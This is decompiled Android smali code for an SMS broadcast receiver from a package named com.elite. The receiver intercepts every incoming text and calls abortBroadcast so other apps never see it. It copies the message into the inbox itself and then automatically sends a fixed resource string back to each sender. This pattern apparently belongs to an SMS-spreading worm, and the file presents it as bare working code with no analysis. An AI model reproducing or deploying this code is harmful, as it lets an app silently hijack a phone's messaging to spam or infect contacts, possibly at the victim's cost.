.class public Lcom/elite/SMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SMSReceiver.java"


# instance fields
.field TAG:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 19
    const-string v0, "SMSReceiver"

    iput-object v0, p0, Lcom/elite/SMSReceiver;->TAG:Ljava/lang/String;

    .line 18
    return-void
.end method


# virtual methods
.method public addSMSIntoInbox(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "sms_from"    # Ljava/lang/String;
    .param p3, "sms_body"    # Ljava/lang/String;

    .prologue
    .line 63
    :try_start_0
    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    .line 64
    .local v1, "values":Landroid/content/ContentValues;
    const-string v2, "address"

    invoke-virtual {v1, v2, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 65
    const-string v2, "body"

    invoke-virtual {v1, v2, p3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 66
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual {v2, v3, v1}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 70
    .end local v1    # "values":Landroid/content/ContentValues;
    :goto_0
    return-void

    .line 67
    :catch_0
    move-exception v0

    .line 68
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 22
    iget-object v7, p0, Lcom/elite/SMSReceiver;->TAG:Ljava/lang/String;

    const-string v8, "onReceive"

    invoke-static {v7, v8}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 23
    const/4 v4, 0x0

    .local v4, "msg_from":Ljava/lang/String;
    const/4 v3, 0x0

    .line 25
    .local v3, "msgBody":Ljava/lang/String;
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v7

    const-string v8, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 26
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 27
    .local v0, "bundle":Landroid/os/Bundle;
    const/4 v5, 0x0

    .line 28
    .local v5, "msgs":[Landroid/telephony/SmsMessage;
    if-eqz v0, :cond_0

    .line 31
    :try_start_0
    const-string v7, "pdus"

    invoke-virtual {v0, v7}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    .line 32
    .local v6, "pdus":[Ljava/lang/Object;
    array-length v7, v6

    new-array v5, v7, [Landroid/telephony/SmsMessage;

    .line 33
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    array-length v7, v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-lt v2, v7, :cond_3

    .line 42
    .end local v2    # "i":I
    .end local v6    # "pdus":[Ljava/lang/Object;
    :cond_0
    :goto_1
    if-nez v4, :cond_1

    if-eqz v3, :cond_2

    .line 44
    :cond_1
    invoke-virtual {p0}, Lcom/elite/SMSReceiver;->abortBroadcast()V

    .line 46
    invoke-virtual {p0, p1, v4, v3}, Lcom/elite/SMSReceiver;->addSMSIntoInbox(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 48
    invoke-static {v4}, Landroid/telephony/PhoneNumberUtils;->isGlobalPhoneNumber(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 49
    new-instance v7, Lcom/elite/MyServices;

    invoke-direct {v7}, Lcom/elite/MyServices;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v8

    const v9, 0x7f080006

    invoke-virtual {v8, v9}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, p1, v4, v8}, Lcom/elite/MyServices;->sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 53
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v5    # "msgs":[Landroid/telephony/SmsMessage;
    :cond_2
    return-void

    .line 34
    .restart local v0    # "bundle":Landroid/os/Bundle;
    .restart local v2    # "i":I
    .restart local v5    # "msgs":[Landroid/telephony/SmsMessage;
    .restart local v6    # "pdus":[Ljava/lang/Object;
    :cond_3
    :try_start_1
    aget-object v7, v6, v2

    check-cast v7, [B

    invoke-static {v7}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v7

    aput-object v7, v5, v2

    .line 35
    aget-object v7, v5, v2

    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v4

    .line 36
    aget-object v7, v5, v2

    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v3

    .line 33
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 38
    .end local v2    # "i":I
    .end local v6    # "pdus":[Ljava/lang/Object;
    :catch_0
    move-exception v1

    .line 39
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
